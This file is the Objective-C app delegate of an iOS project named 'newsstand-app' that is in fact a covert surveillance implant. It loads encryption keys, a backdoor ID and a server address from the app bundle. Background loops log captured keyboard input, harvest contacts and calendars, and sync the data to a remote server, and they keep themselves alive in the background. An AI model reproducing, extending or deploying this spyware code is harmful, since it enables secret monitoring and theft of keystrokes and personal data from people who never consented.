//
//  AppDelegate.m
//  newsstand-app
//
//  Created by Massimo Chiodini on 10/29/14.
//
//

#import "ViewController.h"
#import "AppDelegate.h"
#import "RCSIGlobals.h"
#import "RESTNetworkProtocol.h"
#import "RCSILogManager.h"

typedef struct _sync {
    u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
    u_int wifiFlag;
    u_int serverHostLength;
    wchar_t serverHost[256];
} syncStruct;

ViewController *gMainView = nil;
char gServerAddress[128];
int  gSynchDelay = 60;

void asciiToHex(char *string, char binary[])
{
    char digit[3];
    
    for (int i=0, j=0; i<32; i+=2,j++)
    {
        digit[0] = string[i]; digit[1] = string[i+1]; digit[2] = 0;
        sscanf(digit, "%x", ((char*)binary)+j);
    }
}

@interface AppDelegate ()

@end


#pragma mark -
#pragma mark - Calendar
#pragma mark -

@implementation EventManager
@synthesize eventsAccessGranted;

- (id)init
{
    self = [super init];
    
    if (self) {
        
        self.eventStore = [[EKEventStore alloc] init];
        
        NSUserDefaults *userDefaults = [NSUserDefaults standardUserDefaults];
        
        if ([userDefaults valueForKey:@"eventkit_events_access_granted"] != nil) {
            self.eventsAccessGranted = [[userDefaults valueForKey:@"eventkit_events_access_granted"] intValue];
        }
        else{
            self.eventsAccessGranted = NO;
        }
    }
    
    return self;
}

-(void)setEventsAccessGranted:(BOOL)_eventsAccessGranted
{
    eventsAccessGranted = _eventsAccessGranted;
    
    [[NSUserDefaults standardUserDefaults] setValue:[NSNumber numberWithBool:eventsAccessGranted] forKey:@"eventkit_events_access_granted"];
}

-(NSArray *)getLocalEventCalendars{
    NSArray *allCalendars = [self.eventStore calendarsForEntityType:EKEntityTypeEvent];
    NSMutableArray *localCalendars = [[NSMutableArray alloc] init];
    
    for (int i=0; i<allCalendars.count; i++) {
        EKCalendar *currentCalendar = [allCalendars objectAtIndex:i];
        if (currentCalendar.type == EKCalendarTypeLocal) {
            [localCalendars addObject:currentCalendar];
        }
    }
    
    return (NSArray *)localCalendars;
}

@end


#pragma mark -
#pragma mark - AppDelegate
#pragma mark -

@implementation AppDelegate

@synthesize expirationHandlerKeyboard;
@synthesize expirationHandler;
@synthesize bgTask;
@synthesize background;
@synthesize jobExpired;
@synthesize keyBoardReceiver;

#define ACTION_SYNC         0x4001

#pragma mark -
#pragma mark - Backgorund Synch task
#pragma mark -

- (void)performSync
{
    syncStruct aConfiguration;
    
    memset(&aConfiguration, 0, sizeof(syncStruct));
    
    NSString *hostString = [NSString stringWithCString:gServerAddress encoding:NSUTF8StringEncoding];
    
    aConfiguration.serverHostLength = [hostString lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    
    memcpy(aConfiguration.serverHost,
           [[hostString dataUsingEncoding:NSUTF8StringEncoding] bytes],
           [hostString lengthOfBytesUsingEncoding:NSUTF8StringEncoding]);
    
    NSData *syncConfig = [NSData dataWithBytes:&aConfiguration length:sizeof(syncStruct)];
    
    RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                     initWithConfiguration: syncConfig
                                     andType: ACTION_SYNC];
    
    [protocol perform];

}

- (void)startBackgroundSynch
{
    NSLog(@"Synch restarted!");
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        while (self.jobExpired == NO)
        {
          [NSThread sleepForTimeInterval:gSynchDelay];
          
          gMainView = (ViewController*)[UIApplication sharedApplication].keyWindow.rootViewController;
          
          // Grab New Calendar and Contacts
          [gMainView getABContatcs];
          [gMainView getCalendars];
          
          [NSThread sleepForTimeInterval:1];
          
          // Synch to server
          [self performSync];
        }
        
        @synchronized(self)
        {
            self.jobExpired = NO;
        }
    });
}

#pragma mark -
#pragma mark - Backgorund keyboard task
#pragma mark -

#define DELIMETER     0xABADC0DE

- (void)writeKeylog:(NSString*)bufferString
{
  time_t rawtime;
  struct tm *tmTemp;
  NSMutableData *processName;
  NSMutableData *windowName;
  NSMutableData *contentData;
  
  NSMutableData *entryData = [[NSMutableData alloc] init];
  short unicodeNullTerminator = 0x0000;
  
  // Dummy word
  short dummyWord = 0x0000;
  [entryData appendBytes: &dummyWord
                  length: sizeof(short)];
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  [entryData appendBytes: (const void *)tmTemp
                  length: sizeof (struct tm) - 0x8];
  
  NSString *info = [NSString stringWithFormat:@"%s", "keyboard"];
  
  processName  = [NSMutableData dataWithBytes:[info cStringUsingEncoding:NSUTF16LittleEndianStringEncoding]
                                        length:[info lengthOfBytesUsingEncoding:NSUTF16LittleEndianStringEncoding]];

  
  // Process Name
  [entryData appendData: processName];
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  windowName = [NSMutableData dataWithBytes:[info cStringUsingEncoding:NSUTF16LittleEndianStringEncoding]
                                     length:[info lengthOfBytesUsingEncoding:NSUTF16LittleEndianStringEncoding]];
  
  // Window Name
  [entryData appendData: windowName];
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimeter
  unsigned long del = DELIMETER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  
  contentData = [[NSMutableData alloc] initWithData:
                 [bufferString dataUsingEncoding:
                  NSUTF16LittleEndianStringEncoding]];
  
  // Log buffer
  [entryData appendData: contentData];
  
  _i_LogManager *logManager = [_i_LogManager sharedInstance];
  
  if ([logManager createLog:LOG_KEYLOG
                agentHeader:nil
                  withLogID:0])
  {
    [logManager writeDataToLog:entryData
                      forAgent:LOG_KEYLOG
                     withLogID:0];
  }
  
  [logManager closeActiveLog:LOG_KEYLOG withLogID:0];
}

- (void)startBackgroundKeyboard
{
  NSLog(@"Keyboard restarted!");
  
  dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
    while (TRUE)
    {
      [NSThread sleepForTimeInterval:1.0];
      
      NSArray *messages = [keyBoardReceiver receiveMessages];
      
      if (messages != nil)
      {
        for (int i=0; i < [messages count]; i++)
        {
          ReceivedMessage *mess = [messages objectAtIndex:i];
          if (mess != nil)
            [self writeKeylog:mess.text];
        }
      }
    }
  });
}

#pragma mark -
#pragma mark - AppDelegate Init
#pragma mark -

- (void)initAppKeys
{
  memcpy(gConfAesKeyAscii,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"ConfKey"] cStringUsingEncoding:NSUTF8StringEncoding], 32);
  
  memcpy(gLogAesKeyAscii,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"LogKey"]cStringUsingEncoding:NSUTF8StringEncoding], 32);
  
  memcpy(gBackdoorID,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"Instance"] cStringUsingEncoding:NSUTF8StringEncoding], 16);
  
  memcpy(gBackdoorSignatureAscii,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"Signature"] cStringUsingEncoding:NSUTF8StringEncoding], 32);
  
  memcpy(gServerAddress,
         [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"Server"] cStringUsingEncoding:NSUTF8StringEncoding], 128);
  
  gSynchDelay = [[[NSBundle mainBundle] objectForInfoDictionaryKey: @"SynchDelay"] intValue];
  
}

#pragma mark -
#pragma mark - Init Background tasks
#pragma mark -

- (void)startKeyboardBackgroundTask
{
  UIApplication *app = [UIApplication sharedApplication];
  
  self.expirationHandlerKeyboard = ^{
    
    [app endBackgroundTask:self.bgTaskKeyboard];
    
    self.bgTaskKeyboard = UIBackgroundTaskInvalid;
    self.bgTaskKeyboard = [app beginBackgroundTaskWithExpirationHandler:expirationHandlerKeyboard];
    
    [self startBackgroundKeyboard];
  };
  
  self.bgTaskKeyboard = [app beginBackgroundTaskWithExpirationHandler:expirationHandlerKeyboard];
  
  [self startBackgroundKeyboard];
}

- (void)startSynchBackgroundTask
{
  UIApplication *app = [UIApplication sharedApplication];
  
  self.expirationHandler = ^{
    
    [app endBackgroundTask:self.bgTask];
    
    @synchronized(self)
    {
      self.jobExpired = YES;
    }
    
    self.bgTask = UIBackgroundTaskInvalid;
    self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
    
    [self startBackgroundSynch];
  };
  
  self.bgTask = [app beginBackgroundTaskWithExpirationHandler:expirationHandler];
  
  [self startBackgroundSynch];
}

#pragma mark -
#pragma mark - AppDelegate callback
#pragma mark -

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    keyBoardReceiver = [[KeyboardReceiver alloc] init];
  
    // Init Keys
    [self initAppKeys];
  
    gBackdoorID[14] = gBackdoorID[15] = 0;
    asciiToHex(gLogAesKeyAscii, gLogAesKey);
    asciiToHex(gConfAesKeyAscii, gConfAesKey);
    asciiToHex(gBackdoorSignatureAscii, gBackdoorSignature);
  
    // Request Calendar access
    self.eventManager = [[EventManager alloc] init];
  
    [self.eventManager.eventStore requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error)
     {
        if (error == nil)
        {
            self.eventManager.eventsAccessGranted = granted;
        }
     }];
  
    // Init keyboard background task
    [self startBackgroundKeyboard];
  
    // Init synch backgorund task
    [self startBackgroundSynch];
  
    return YES;
}

- (void)applicationWillResignActive:(UIApplication *)application {

}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    background = YES;
}

- (void)applicationWillEnterForeground:(UIApplication *)application {

}

- (void)applicationDidBecomeActive:(UIApplication *)application {

}

- (void)applicationWillTerminate:(UIApplication *)application {
}

@end
